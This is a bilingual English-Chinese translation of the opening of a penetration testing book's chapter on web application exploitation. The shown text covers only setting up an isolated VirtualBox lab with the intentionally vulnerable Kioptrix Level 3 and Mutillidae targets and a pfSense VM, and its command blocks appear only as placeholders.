- en: Chapter 5. Web Application Exploitation
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 第5章。Web应用程序利用
- en: In this chapter, we will explore various methods of testing web applications
    using freely available tools such as your web browser, w3af, WebScarab, and others.
    We will also discuss methods of bypassing web application firewalls and intrusion
    detection systems and how to determine if your targets are being load balanced
    or filtered. This chapter does require significant lab preparation. If you are
    not following along with the examples, you may want to bypass these portions.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将探讨使用免费工具（如您的网络浏览器、w3af、WebScarab等）测试Web应用程序的各种方法。我们还将讨论绕过Web应用程序防火墙和入侵检测系统的方法，以及如何确定目标是否正在进行负载平衡或过滤。本章需要进行大量的实验室准备。如果您不跟着示例进行操作，您可能希望跳过这些部分。
- en: It is of importance to note that in a secured environment web-based applications
    may be the most direct method of gaining a toe-hold in the network you are testing.
    They are also the most likely entry point used by malicious users. It seems that
    every day there are more breach notices released and most of these stem from web
    application security flaws or misconfigurations. Considering that many of these
    applications are accessible to the public via the Internet, web applications are
    prime targets. The Internet still provides various methods of anonymity, thus
    limiting the actual risk that would-be attackers face. After all, it is difficult
    to prosecute someone you can't catch.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 需要注意的是，在安全环境中，基于Web的应用程序可能是获得您正在测试的网络中的立足点的最直接方法。它们也是恶意用户最有可能使用的入口点。似乎每天都有更多的违规通知发布，其中大多数源于Web应用程序安全漏洞或配置错误。考虑到这些应用程序中的许多是通过互联网对公众开放的，因此Web应用程序是主要目标。互联网仍然提供各种匿名方法，从而限制了潜在攻击者面临的实际风险。毕竟，很难起诉你无法抓住的人。
- en: Note
  id: totrans-3
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: There are numerous methods of performing this type of testing. We would need
    to dedicate an entire book to cover them all. Keeping this in mind we have provided
    guidance on techniques that provide the most benefit when targeting secured environments.
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 有许多种方法可以进行这种类型的测试。我们需要专门撰写一本书来覆盖所有方法。考虑到这一点，我们提供了有关在针对安全环境时提供最大利益的技术指导。
- en: Businesses will typically use a risk-based approach when deciding on where the
    security dollars should be spent, and decisions made while under time and budget
    constraints can sometime lead to unintentional mistakes that have a profound impact
    on the entire security posture of the environment. A penetration tester must be
    able to imitate the types of attacks that the client will be likely to face in
    the wild, and provide accurate information about how the vulnerabilities that
    are found can be mitigated. At times these applications will even allow an attacker
    to easily bypass all of the security controls in place. Not only will the business
    be at risk of losing critical information, but all funds spent on securing the
    other aspects of the architecture will have been completely wasted.
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 企业在决定安全预算应该花在哪里时通常会采用基于风险的方法，而在时间和预算限制下做出的决定有时会导致意外的错误，对整个环境的安全姿态产生深远影响。渗透测试人员必须能够模仿客户在野外可能面临的攻击类型，并提供有关如何减轻发现的漏洞的准确信息。有时这些应用甚至会让攻击者轻松绕过所有已经存在的安全控制。企业不仅面临失去关键信息的风险，而且在保护架构的其他方面上花费的所有资金都将被彻底浪费。
- en: As with the other chapters we begin by quickly reviewing the basics of our chosen
    tools and then moving on to some of the more interesting techniques.
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
  zh: 与其他章节一样，我们首先快速回顾我们选择的工具的基础知识，然后转向一些更有趣的技术。
- en: Practice makes perfect
  id: totrans-7
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 熟能生巧
- en: Penetration testing requires the use of skills that take time and practice to
    perfect. To encourage the absorption of the material within this chapter we will
    be adding a load balanced instance of an intentionally vulnerable Linux distribution
    to our lab. We will also use our Ubuntu virtual machine to host Mutillidae 2.1.7
    (provided to the community at [http://www.irongeek.com)](http://www.irongeek.com)),
    which is a web-based application with intentional security flaws which we will
    then exploit.
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 渗透测试需要使用需要时间和实践来完善的技能。为了鼓励吸收本章的材料，我们将在我们的实验室中添加一个负载平衡的有意漏洞的Linux发行版实例。我们还将使用我们的Ubuntu虚拟机来托管Mutillidae
    2.1.7（提供给社区的[http://www.irongeek.com](http://www.irongeek.com)），这是一个具有故意安全漏洞的基于Web的应用程序，我们将利用这些漏洞。
- en: If you have worked your way through the chapters of this book you will already
    be familiar with Kioptrix Level 1\. We now move on to a more advanced Kioptrix
    distribution that has been made available to the community by Steven McElrea (aka
    loneferret) and Richard Dinelle (aka haken29a ) of the [www.kioptrix.com](http://www.kioptrix.com)
    team.
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您已经阅读了本书的各章节，您应该已经熟悉了Kioptrix Level 1。现在我们将转向更高级的Kioptrix发行版，由Steven McElrea（又名loneferret）和Richard
    Dinelle（又名haken29a）的[www.kioptrix.com](http://www.kioptrix.com)团队提供给社区。
- en: 'In order to follow along with the examples in this chapter the virtual lab
    will need to be configured as follows:'
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 为了跟随本章的示例，虚拟实验室需要配置如下：
- en: '**BackTrack Linux:** Connected to internal network `VLAN1`'
  id: totrans-11
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**BackTrack Linux：**连接到内部网络`VLAN1`'
- en: '**Kioptrix VM Level 3:** Connected to internal network `VLAN1`'
  id: totrans-12
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Kioptrix VM Level 3：**连接到内部网络`VLAN1`'
- en: '**Kioptrix VM Level 3 Clone:** Connected to internal network `VLAN1`'
  id: totrans-13
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Kioptrix VM Level 3 Clone：**连接到内部网络`VLAN1`'
- en: '**Ubuntu_TestMachine_1** with Mutillidae installed: Connected to `VLAN1`'
  id: totrans-14
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Ubuntu_TestMachine_1**已安装Mutillidae：连接到`VLAN1`'
- en: '**PFSense VM:** Connected to internal network `VLAN1`. This will provide our
    load balancing'
  id: totrans-15
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**PFSense VM：**连接到内部网络`VLAN1`。这将为我们的负载平衡提供支持'
- en: We will walk through the installation of Kioptrix 3, creating a VM clone, installing
    Mutillidae on Ubuntu, and preparing PfSense for our current needs.
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将演示安装Kioptrix 3、创建VM克隆、在Ubuntu上安装Mutillidae，并为我们当前的需求准备PfSense。
- en: Note
  id: totrans-17
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: The VLAN1 network connection can be created by simply choosing internal network
    in the network settings of your Oracle VM manager for each guest machine. PfSense
    will be used to provide a DHCP server for the guest machine IP addresses.
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: VLAN1网络连接可以通过在Oracle VM管理器的网络设置中简单地选择内部网络来创建。PfSense将用于为客户机IP地址提供DHCP服务器。
- en: 'Please review the abstract network diagram:'
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 请查看抽象网络图：
- en: '![Practice makes perfect](img/7744_05_01.jpg)'
  id: totrans-20
  prefs: []
  type: TYPE_IMG
  zh: '![熟能生巧](img/7744_05_01.jpg)'
- en: Installing Kioptrix Level 3
  id: totrans-21
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 安装Kioptrix Level 3
- en: One of the most effective means of learning is by getting hands-on practice.
    Kioptrix Level 3 which has been made freely available to the community by loneferret
    (Steven McElrea) and haken29a (Richard Dinelle) is intended to provide a basic
    platform that can be used to gain this experience. This particular distribution
    provides us with a platform that contains several web application security flaws
    that we will exploit to explore the various methods of hands-on web application
    exploitation.
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 学习最有效的方法之一是进行实践。Kioptrix Level 3是由loneferret（Steven McElrea）和haken29a（Richard
    Dinelle）免费提供给社区的，旨在提供一个基本平台，用于获得这种经验。这个特定的发行版为我们提供了一个包含多个Web应用程序安全漏洞的平台，我们将利用这些漏洞来探索各种实践的Web应用程序利用方法。
- en: Head over to the [http://www.kioptrix.com](http://www.kioptrix.com) website,
    chose your language of choice and then click on the **Kioptrix VM Level 1.2**
    link to the right of the page.
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 前往[http://www.kioptrix.com](http://www.kioptrix.com)网站，选择您喜欢的语言，然后点击页面右侧的**Kioptrix
    VM Level 1.2**链接。
- en: '![Installing Kioptrix Level 3](img/7744_05_02.jpg)'
  id: totrans-24
  prefs: []
  type: TYPE_IMG
  zh: '![安装Kioptrix Level 3](img/7744_05_02.jpg)'
- en: 'You will need to extract the files to a location of choice. At this point this
    procedure should be familiar. Open up Oracle VirtualBox and create a new guest
    machine using the settings defined below:'
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 您需要将文件提取到所选位置。此时，这个过程应该是熟悉的。打开Oracle VirtualBox并使用以下定义的设置创建一个新的虚拟机：
- en: 'Name: Kioptrix VM Level 3'
  id: totrans-26
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 名称：Kioptrix VM Level 3
- en: 'OS Type: Other Linux'
  id: totrans-27
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 操作系统类型：其他Linux
- en: 'Memory: 256'
  id: totrans-28
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 内存：256
- en: 'Startup Disk: Kioptrix Level 3.vmdk (Normal, 3.00 GB)'
  id: totrans-29
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 启动磁盘：Kioptrix Level 3.vmdk（正常，3.00 GB）
- en: 'To use the existing Kioptrix machine you will need to select: **Use existing
    hard disk** option as shown in the following screenshot:'
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 要使用现有的Kioptrix机器，您需要选择：如下截图所示的**使用现有硬盘**选项：
- en: '![Installing Kioptrix Level 3](img/7744_05_03.jpg)'
  id: totrans-31
  prefs: []
  type: TYPE_IMG
  zh: '![安装Kioptrix Level 3](img/7744_05_03.jpg)'
- en: You will need to add the new Kioptrix system to your virtual network in the
    **Network Settings** portion of Oracle VirtualBox to ensure that the system is
    sharing the same restricted network as the BackTrack guest machine. Both should
    be set to use `VLAN1`.
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 需要将新的Kioptrix系统添加到Oracle VirtualBox的**网络设置**部分，以确保该系统与BackTrack虚拟机共享相同的受限网络。两者都应设置为使用`VLAN1`。
- en: Note
  id: totrans-33
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: If experiencing errors upon booting the Kioptrix Level 3 Virtual machine, edit
    the **Virtual Machine** settings and enable IO APIC setting in **System - Motherboards**.
    PAE/NX under processor settings may also need to be enabled.
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 如果在启动Kioptrix Level 3虚拟机时遇到错误，请编辑**虚拟机**设置，并在**系统-主板**中启用IO APIC设置。处理器设置下的PAE/NX也可能需要启用。
- en: '![Installing Kioptrix Level 3](img/7744_05_04.jpg)'
  id: totrans-35
  prefs: []
  type: TYPE_IMG
  zh: '![安装Kioptrix Level 3](img/7744_05_04.jpg)'
- en: Kioptrix Level 3 can be tackled using various means because this distribution
    is designed to assist beginners in learning penetration testing concepts. We are
    able to focus on the methodologies used to exploit the machine rather than wasting
    time trying to break through the security mechanisms designed to mislead or confuse
    an attacker that you may run into during a real penetration test.
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: Kioptrix Level 3可以通过各种方式来解决，因为这个发行版旨在帮助初学者学习渗透测试概念。我们能够专注于用于利用机器的方法论，而不是浪费时间试图突破旨在误导或混淆攻击者的安全机制，这些安全机制可能在真正的渗透测试中遇到。
- en: Creating a Kioptrix VM Level 3 clone
  id: totrans-37
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 创建Kioptrix VM Level 3克隆
- en: We will be using a virtual load balancer to ensure that we are accurately emulating
    the types of technologies that are most likely to be found in secured environments.
    To this aim, we will need to create another instance of the Kioptrix VM. You could
    easily follow the steps previously outlined to accomplish this task, or you could
    take advantage of the cloning feature included with Oracle's VirtualBox Manager.
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将使用虚拟负载均衡器来确保我们准确模拟最有可能在安全环境中找到的技术类型。为此，我们需要创建另一个Kioptrix VM的实例。您可以轻松地按照之前概述的步骤来完成此任务，或者您可以利用Oracle
    VirtualBox Manager中包含的克隆功能。
- en: 'To clone virtual guest machines perform the following steps:'
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: 要克隆虚拟客户机，请执行以下步骤：
- en: Open the **Oracle VM VirtualBox Manager**.
  id: totrans-40
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 打开**Oracle VM VirtualBox Manager**。
- en: If necessary, power down the machine that is to be cloned.
  id: totrans-41
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果需要，关闭要克隆的机器。
- en: Right-click on the Kioptrix VM Level 3 guest machine and choose the **Clone**
    option.
  id: totrans-42
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 右键单击Kioptrix VM Level 3虚拟机，然后选择**克隆**选项。
- en: Check the **Reinitialize the MAC address of all network cards** option.![Creating
    a Kioptrix VM Level 3 clone](img/7744_05_05.jpg)
  id: totrans-43
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 勾选**重新初始化所有网络卡的MAC地址**选项。![创建Kioptrix VM Level 3克隆](img/7744_05_05.jpg)
- en: Click on **Next**.
  id: totrans-44
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击**下一步**。
- en: Select the **Full Clone** radial button.
  id: totrans-45
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择**完全克隆**单选按钮。
- en: Click on **Clone** to complete the process.
  id: totrans-46
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击**克隆**完成该过程。
- en: By choosing to reinitialize the MAC addresses of all systems we ensure that
    network conflicts are avoided in the future.
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 通过选择重新初始化所有系统的MAC地址，我们确保将来避免网络冲突。
- en: '**After the complete lab setup has been completed please note the following:**'
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: '**完成完整的实验设置后，请注意以下事项：**'
- en: You will need to add the IP information of the target machine (which uses DHCP)
    to your BackTrack tester 1 instance. Allow the target machine (Kioptrix) to boot
    up and obtain an IP address. Perform a quick scan of your virtual network to find
    the assigned IP address of the Kioptrix instance and add it to your host file
    in BackTrack.
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 您需要将目标机器（使用DHCP）的IP信息添加到BackTrack测试器1实例中。允许目标机器（Kioptrix）启动并获取IP地址。快速扫描您的虚拟网络，找到Kioptrix实例的分配IP地址，并将其添加到BackTrack的主机文件中。
- en: Installing and configuring Mutillidae 2.1.7 on the Ubuntu virtual machine
  id: totrans-50
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 在Ubuntu虚拟机上安装和配置Mutillidae 2.1.7
- en: 'Mutillidae is a collection of scripts created by Adrian "Irongeek" Crenshaw
    and Jeremy Druin that are intentionally vulnerable to the OWASP top 10\. Detailed
    information about the release can be found at: [http://www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10](http://www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10).'
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: Mutillidae是由Adrian "Irongeek" Crenshaw和Jeremy Druin创建的一组脚本，故意对OWASP前10名进行了漏洞测试。有关发布的详细信息，请访问：[http://www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10](http://www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10)。
- en: We will be using these scripts to practice some of the techniques that you should
    become familiar with in order to take on the challenge of performing penetration
    testing on a secured environment.
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将使用这些脚本来练习一些您应该熟悉的技术，以便在受保护的环境中进行渗透测试的挑战。
- en: Note
  id: totrans-53
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: You can also take advantage of the hints that Mutillidae has included in each
    level of the distribution to gain confidence in web application testing if you
    need the practice.
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 如果需要练习，您还可以利用Mutillidae在分发的每个级别中包含的提示来增强对Web应用程序测试的信心。
- en: As we had previously mentioned, web applications make a very fine target and
    are often found to be unsecured due to an assortment of reasons including unplanned
    software updates, a general lack of good coding practices, and so on.
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 正如我们之前提到的，Web应用程序是一个非常好的目标，通常由于各种原因，包括计划外的软件更新、缺乏良好的编码实践等，往往会发现它们是不安全的。
- en: To begin we will need to configure your **Ubuntu_TestMachine_1** to use two
    network adapters, one for NAT and one for Internal Network VLAN1\. This process
    should be familiar by now, so we will forego reviewing the steps required to perform
    this task.
  id: totrans-56
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 首先，我们需要配置您的**Ubuntu_TestMachine_1**以使用两个网络适配器，一个用于NAT，一个用于内部网络VLAN1。这个过程现在应该很熟悉了，所以我们将不再回顾执行此任务所需的步骤。
- en: Boot up the **Ubuntu_TestMachine_1** and verify connectivity to the Internet.
    This would be the perfect time to grab any software updates that are needed as
    well.
  id: totrans-57
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 启动**Ubuntu_TestMachine_1**，并验证与互联网的连接。现在是抓取所需的任何软件更新的最佳时机。
- en: 'Head over to: [http://www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10](http://www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10)
    and download a copy of Mutillidae 2.1.7 from Adrian Crenshaw''s (Irongeek) website.
    The Mutillidae developers have worked hard to provide the community with an effective
    distribution to test our skills against the OWASP top 10.'
  id: totrans-58
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 前往：[http://www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10](http://www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10)，并从Adrian
    Crenshaw（Irongeek）的网站上下载Mutillidae 2.1.7的副本。Mutillidae的开发人员努力为社区提供了一个有效的分发，以测试我们的技能对抗OWASP前10名。
- en: Tip
  id: totrans-59
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 提示
- en: The [www.irongeek.com](http://www.irongeek.com) website is full of fantastic
    information; I highly recommend that you take the time to review some of the penetration
    testing information IronGeek has either collected or created, and made available
    to the community!
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.irongeek.com](http://www.irongeek.com)网站充满了精彩的信息；我强烈建议您抽出时间查看IronGeek收集或创建并提供给社区的一些渗透测试信息！'
- en: Open up a console window and change directory to `Downloads/`.
  id: totrans-61
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 打开控制台窗口，切换到`Downloads/`目录。
- en: '[PRE0]'
  id: totrans-62
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: 'Unzip the `mutillidae-2.1.7.zip` file:'
  id: totrans-63
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 解压缩`mutillidae-2.1.7.zip`文件：
- en: '[PRE1]'
  id: totrans-64
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'Copy the `mutillidae` folder to the `/var/www` directory:'
  id: totrans-65
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将`mutillidae`文件夹复制到`/var/www`目录：
- en: '[PRE2]'
  id: totrans-66
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: Now we need to configure the database connection so that mutillidae functions
    properly. We need to change the `config.inc` file to reflect that we have a MySQL
    password for root. Replace `1EasyPassword` with your MySQL root password.
  id: totrans-67
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们需要配置数据库连接，以便mutillidae正常运行。我们需要更改`config.inc`文件以反映我们为root设置了MySQL密码。将`1EasyPassword`替换为您的MySQL
    root密码。
- en: Note
  id: totrans-68
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: 'Do you remember the MySQL root password you used in [Chapter 3](ch03.html "Chapter 3. Enumeration:
    Choosing Your Targets Wisely"), *Enumeration: Choosing Your Targets Wisely?* If
    not, then you can probably identify with the reason that so many passwords are
    reused by administrators out in the real world! Proper password management is
    critical in large environments with many machines. There are tools available that
    can be used to provide one time use passwords as well as other mechanisms that
    improve authentication methodologies.'
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 您还记得您在[第3章](ch03.html "第3章。枚举：明智地选择您的目标")中使用的MySQL root密码吗，*枚举：明智地选择您的目标*？如果不记得，那么您可能能够理解现实世界中为什么有这么多管理员重复使用密码的原因！在拥有许多机器的大型环境中，正确的密码管理至关重要。有一些可用的工具可以用来提供一次性密码以及其他改进身份验证方法的机制。
- en: '[PRE3]'
  id: totrans-70
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: Use *CTRL + O* and *Enter* followed by *CTRL + X* to save the file and return
    to the command line.
  id: totrans-71
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 使用*CTRL + O*和*Enter*，然后使用*CTRL + X*保存文件并返回到命令行。
- en: Open up the Firefox browser in Ubuntu and browse to `http://localhost/mutillidae`.
  id: totrans-72
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在Ubuntu中打开Firefox浏览器，浏览到`http://localhost/mutillidae`。
- en: Click on the **Setup/Reset the DB** link in the top navigation bar.![Installing
    and configuring Mutillidae 2.1.7 on the Ubuntu virtual machine](img/7744_05_06.jpg)
  id: totrans-73
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 单击顶部导航栏中的**设置/重置DB**链接。![在Ubuntu虚拟机上安装和配置Mutillidae 2.1.7](img/7744_05_06.jpg)
- en: That's it! Now we need to reboot the machine and **disable the NAT connection**
    so that it is not accessible via the Internet. These pages should **NOT** be made
    available to malicious users on the Internet.
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 就是这样！现在我们需要重新启动机器并**禁用NAT连接**，以便它无法通过互联网访问。这些页面**不应**向互联网上的恶意用户提供。
- en: Installing and configuring pfSense
  id: totrans-75
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 安装和配置pfSense
- en: pfSense is a freely available implementation of a virtual firewall and router
    that is based on FreeBSD. Extremely configurable, it is the ideal choice for various
    applications including setting up a virtual lab to practice penetration testing.
    pfSense provides far more than simple firewalling. Being that it is easy to install
    and configure, makes pfSense ideal for our purposes; after all, right now we are
    trying to keep things simple so that we can focus on the important aspects of
    penetration testing rather than lengthy discussions on proper configuration of
    complicated virtual routers and switches.
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: pfSense是一个基于FreeBSD的虚拟防火墙和路由器的免费实现。它非常灵活，是各种应用的理想选择，包括建立虚拟实验室进行渗透测试。pfSense提供的远不止简单的防火墙功能。由于它易于安装和配置，使得pfSense非常适合我们的目的；毕竟，我们现在正在努力保持简单，以便我们可以专注于渗透测试的重要方面，而不是冗长的讨论复杂虚拟路由器和交换机的正确配置。
- en: Preparing the virtual machine for pfSense
  id: totrans-77
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 为pfSense准备虚拟机
- en: 'pfSense must be downloaded and installed as a virtual guest machine. Please
    download the distribution before moving to the next step. A link to the pfSense
    download mirrors is located at: [http://www.pfsense.org/mirror.php?section=downloads](http://www.pfsense.org/mirror.php?section=downloads).'
  id: totrans-78
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: pfSense必须作为虚拟客户机下载和安装。在进行下一步之前，请下载分发。pfSense下载镜像的链接位于：[http://www.pfsense.org/mirror.php?section=downloads](http://www.pfsense.org/mirror.php?section=downloads)。
- en: Select a mirror near your physical location to improve the download speed.
  id: totrans-79
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择靠近您物理位置的镜像以提高下载速度。
- en: Download the appropriate distribution to a location of your choosing. We will
    be using `pfSense-2.0-RELEASE-i386.iso.gz` for the examples in this chapter.
  id: totrans-80
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下载适当的发行版到您选择的位置。在本章的示例中，我们将使用`pfSense-2.0-RELEASE-i386.iso.gz`。
- en: Validate the MD5 of the download and then unzip it to a location of choice.
  id: totrans-81
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 验证下载的MD5，然后解压到所选位置。
- en: Open up **Oracle VM VirtualBox Manager** and select the **New** icon and click
    on **Next**.
  id: totrans-82
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 打开“Oracle VM VirtualBox Manager”，选择“新建”图标，然后单击“下一步”。
- en: Type pfSense VLAN1 and use the drop-down menus to select **BSD** as the **Operating
    System** and **FreeBSD** as the **Version**, and then click on **Next**.![Preparing
    the virtual machine for pfSense](img/7744_05_07.jpg)
  id: totrans-83
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 键入pfSense VLAN1，并使用下拉菜单选择**BSD**作为**操作系统**和**FreeBSD**作为**版本**，然后单击“下一步”。![为pfSense准备虚拟机](img/7744_05_07.jpg)
- en: Choose 256 MB of RAM if you have the system resources available. The minimum
    requirements suggest that you use at least 128 MB. Click on **Next** when ready
    to move on.
  id: totrans-84
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果系统资源可用，选择256 MB的RAM。最低要求建议您至少使用128 MB。准备好后，单击“下一步”。
- en: In order to install pfSense we will need to create a new hard disk. We will
    be using 6 GB for our installation. This setting can be as low as 2 GB and still
    be effective, but you will be limited in expanding the features that pfSense provides.
    Click on **Next** after selecting the **Create new hard disk** radial option.
  id: totrans-85
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了安装pfSense，我们需要创建一个新的硬盘。我们将使用6 GB进行安装。此设置可以低至2 GB并且仍然有效，但您将受到扩展pfSense功能的限制。在选择**创建新硬盘**径向选项后，单击“下一步”。
- en: Select **VDI (Virtual Disk Image)** and click on **Next**.
  id: totrans-86
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择**VDI（虚拟磁盘映像）**，然后单击“下一步”。
- en: 'Choose: **Dynamically allocated** for the virtual disk file and click on **Next**.'
  id: totrans-87
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择：**动态分配**虚拟磁盘文件，然后单击“下一步”。
- en: If disk space is not tight on your machine chose at least **6 GB**. This will
    be dynamically allocated in chunks of 2 GB, but it is much easier to set a larger
    size now than to change it later. Click on **Next**.
  id: totrans-88
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果您的机器上的磁盘空间不紧张，请至少选择**6 GB**。这将以2 GB的块动态分配，但现在设置较大的大小要比以后更改更容易。单击“下一步”。
- en: Ensure that your settings are similar to the following and click on the **Create**
    button to finalize the creation of the pfSense virtual machine.![Preparing the
    virtual machine for pfSense](img/7744_05_08.jpg)
  id: totrans-89
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 确保您的设置与以下设置类似，并单击“创建”按钮以完成创建pfSense虚拟机。![为pfSense准备虚拟机](img/7744_05_08.jpg)
- en: Right-click the pfSense VLAN1 instance and chose **Settings**. We need to enable
    two network devices for this virtual machine. Assign Network Adapter 1 to internal
    networks **WLAN1** and Network Adapter 2 to **VLAN1**. You may have to type in
    the internal network name manually if it has not been used before. Select the
    **PCNet-PCI II** adapter from the drop-down menu on both interfaces (under the
    **Advanced** menu) to avoid network issues related to FreeBSD and VirtualBox.
  id: totrans-90
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 右键单击pfSense VLAN1实例，选择“设置”。我们需要为这台虚拟机启用两个网络设备。将网络适配器1分配给内部网络**WLAN1**，将网络适配器2分配给**VLAN1**。如果以前没有使用过内部网络名称，您可能需要手动输入。从下拉菜单中选择**PCNet-PCI
    II**适配器（在**高级**菜单下的两个接口下）以避免与FreeBSD和VirtualBox相关的网络问题。
- en: Select **Allow VMs** from the **Promiscuous Mode** drop-down menu before clicking
    on **OK** and closing the window.
  id: totrans-91
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在单击**OK**并关闭窗口之前，从**混杂模式**下拉菜单中选择**允许VMs**。
- en: Select **PFSense VLAN1** in the Oracle VM VirtualBox manager and click on the
    **Start** icon.
  id: totrans-92
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在Oracle VM VirtualBox管理器中选择**PFSense VLAN1**，然后单击**启动**图标。
- en: Click on **Next** at the **First Run Wizard** screen that pops up.
  id: totrans-93
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在弹出的**首次运行向导**屏幕上单击“下一步”。
- en: Click on the icon to the right of the screen, browse to where you have downloaded
    and extracted `PFSense.iso`, select it and click on **Open**.
  id: totrans-94
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 单击屏幕右侧的图标，浏览到您下载并提取`PFSense.iso`的位置，选择它，然后单击“打开”。
- en: Click on **Next**.
  id: totrans-95
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 单击“下一步”。
- en: pfSense virtual machine persistence
  id: totrans-96
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: pfSense虚拟机持久性
